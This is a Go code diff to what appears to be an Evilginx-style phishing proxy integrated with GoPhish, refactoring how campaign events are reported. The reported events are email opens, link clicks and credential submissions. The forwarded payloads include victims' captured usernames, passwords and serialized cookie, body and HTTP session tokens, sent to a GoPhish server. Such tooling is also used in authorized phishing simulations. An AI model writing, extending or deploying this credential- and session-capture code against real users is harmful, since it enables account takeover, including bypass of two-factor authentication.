@@ -19,7 +19,6 @@ import (
 	"fmt"
 	"html"
 	"io"
-	"io/ioutil"
 	"net"
 	"net/http"
 	"net/url"
@@ -385,11 +384,19 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 												if ok && rid != "" {
 													log.Info("[gophish] [%s] email opened: %s (%s)", hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
 													p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
-													rq := ResultRequest{
-														Address:   remote_addr,
-														UserAgent: req.Header.Get("User-Agent"),
+													rq := EventDetails{
+
+														Browser: make(map[string]string),
 													}
-													err = p.gophish.ReportEmailOpened(rid, rq)
+													rq.Browser["address"] = remote_addr
+													rq.Browser["user-agent"] = req.Header.Get("User-Agent")
+													rd := ResultRequest{
+														Target:       rid,
+														Action:       "opened",
+														Type:         "2fa",
+														EventDetails: rq,
+													}
+													err = p.gophish.ReportGophish(rd)
 													if err != nil {
 														log.Error("gophish: %s", err)
 													}
@@ -410,11 +417,18 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										rid, ok := session.Params["rid"]
 										if ok && rid != "" {
 											p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
-											rq := ResultRequest{
-												Address:   remote_addr,
-												UserAgent: req.Header.Get("User-Agent"),
+											rq := EventDetails{
+												Browser: make(map[string]string),
 											}
-											err = p.gophish.ReportEmailLinkClicked(rid, rq)
+											rq.Browser["address"] = remote_addr
+											rq.Browser["user-agent"] = req.Header.Get("User-Agent")
+											rd := ResultRequest{
+												Target:       rid,
+												Action:       "clicked",
+												Type:         "email",
+												EventDetails: rq,
+											}
+											err = p.gophish.ReportGophish(rd)
 											if err != nil {
 												log.Error("gophish: %s", err)
 											}
@@ -560,7 +574,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 							path := filepath.Join(t_dir, rel_path)
 							if _, err := os.Stat(path); !os.IsNotExist(err) {
-								fdata, err := ioutil.ReadFile(path)
+								fdata, err := os.ReadFile(path)
 								if err == nil {
 									//log.Debug("ext: %s", filepath.Ext(req_path))
 									mime_type := getContentType(req_path, fdata)
@@ -1074,22 +1088,23 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							rid, ok := s.Params["rid"]
 							if ok && rid != "" {
 								p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
-								rq := ResultRequest{
-									Address:   s.RemoteAddr,
-									UserAgent: s.UserAgent,
-									EventDetails: EventDetails{
-										Payload: url.Values{
-											"evilid":   {s.Id},
-											"name":     {s.Name},
-											"username": {s.Username},
-											"password": {s.Password},
-											"phishlet": {s.PhishLure.Phishlet},
-										},
-										Browser: map[string]string{
-											"address":    s.RemoteAddr,
-											"user-agent": s.UserAgent,
-										},
+								rq := EventDetails{
+									Payload: url.Values{
+										"evilid":   {s.Id},
+										"name":     {s.Name},
+										"username": {s.Username},
+										"password": {s.Password},
+										"phishlet": {s.PhishLure.Phishlet},
 									},
+									Browser: make(map[string]string),
+								}
+								rq.Browser["address"] = s.RemoteAddr
+								rq.Browser["user-agent"] = s.UserAgent
+								rd := ResultRequest{
+									Target:       rid,
+									Action:       "opened",
+									Type:         "2fa",
+									EventDetails: rq,
 								}
 
 								// Serialize the maps to JSON
@@ -1097,31 +1112,31 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								if err != nil {
 									log.Error("Failed to serialize BodyTokens: %s", err)
 								} else {
-									rq.EventDetails.Payload.Set("bodytokens", string(bodytokensJSON))
+									rd.EventDetails.Payload.Set("bodytokens", string(bodytokensJSON))
 								}
 
 								cookietokensJSON, err := json.Marshal(s.CookieTokens)
 								if err != nil {
 									log.Error("Failed to serialize HttpTokens: %s", err)
 								} else {
-									rq.EventDetails.Payload.Set("cookietokens", string(cookietokensJSON))
+									rd.EventDetails.Payload.Set("cookietokens", string(cookietokensJSON))
 								}
 
 								httptokensJSON, err := json.Marshal(s.HttpTokens)
 								if err != nil {
 									log.Error("Failed to serialize HttpTokens: %s", err)
 								} else {
-									rq.EventDetails.Payload.Set("httptokens", string(httptokensJSON))
+									rd.EventDetails.Payload.Set("httptokens", string(httptokensJSON))
 								}
 
 								customJSON, err := json.Marshal(s.Custom)
 								if err != nil {
 									log.Error("Failed to serialize Custom: %s", err)
 								} else {
-									rq.EventDetails.Payload.Set("custom", string(customJSON))
+									rd.EventDetails.Payload.Set("custom", string(customJSON))
 								}
 
-								err = p.gophish.ReportCredentialsSubmitted(rid, rq)
+								err = p.gophish.ReportGophish(rd)
 								if err != nil {
 									log.Error("gophish: %s", err)
 								}
@@ -1261,22 +1276,23 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								rid, ok := s.Params["rid"]
 								if ok && rid != "" {
 									p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
-									rq := ResultRequest{
-										Address:   s.RemoteAddr,
-										UserAgent: s.UserAgent,
-										EventDetails: EventDetails{
-											Payload: url.Values{
-												"evilid":   {s.Id},
-												"name":     {s.Name},
-												"username": {s.Username},
-												"password": {s.Password},
-												"phishlet": {s.PhishLure.Phishlet},
-											},
-											Browser: map[string]string{
-												"address":    s.RemoteAddr,
-												"user-agent": s.UserAgent,
-											},
+									rq := EventDetails{
+										Payload: url.Values{
+											"evilid":   {s.Id},
+											"name":     {s.Name},
+											"username": {s.Username},
+											"password": {s.Password},
+											"phishlet": {s.PhishLure.Phishlet},
 										},
+										Browser: make(map[string]string),
+									}
+									rq.Browser["address"] = s.RemoteAddr
+									rq.Browser["user-agent"] = s.UserAgent
+									rd := ResultRequest{
+										Target:       rid,
+										Action:       "opened",
+										Type:         "2fa",
+										EventDetails: rq,
 									}
 
 									// Serialize the maps to JSON
@@ -1284,31 +1300,31 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									if err != nil {
 										log.Error("Failed to serialize BodyTokens: %s", err)
 									} else {
-										rq.EventDetails.Payload.Set("bodytokens", string(bodytokensJSON))
+										rd.EventDetails.Payload.Set("bodytokens", string(bodytokensJSON))
 									}
 
 									cookietokensJSON, err := json.Marshal(s.CookieTokens)
 									if err != nil {
 										log.Error("Failed to serialize HttpTokens: %s", err)
 									} else {
-										rq.EventDetails.Payload.Set("cookietokens", string(cookietokensJSON))
+										rd.EventDetails.Payload.Set("cookietokens", string(cookietokensJSON))
 									}
 
 									httptokensJSON, err := json.Marshal(s.HttpTokens)
 									if err != nil {
 										log.Error("Failed to serialize HttpTokens: %s", err)
 									} else {
-										rq.EventDetails.Payload.Set("httptokens", string(httptokensJSON))
+										rd.EventDetails.Payload.Set("httptokens", string(httptokensJSON))
 									}
 
 									customJSON, err := json.Marshal(s.Custom)
 									if err != nil {
 										log.Error("Failed to serialize Custom: %s", err)
 									} else {
-										rq.EventDetails.Payload.Set("custom", string(customJSON))
+										rd.EventDetails.Payload.Set("custom", string(customJSON))
 									}
 
-									err = p.gophish.ReportCredentialsSubmitted(rid, rq)
+									err = p.gophish.ReportGophish(rd)
 									if err != nil {
 										log.Error("gophish: %s", err)
 									}
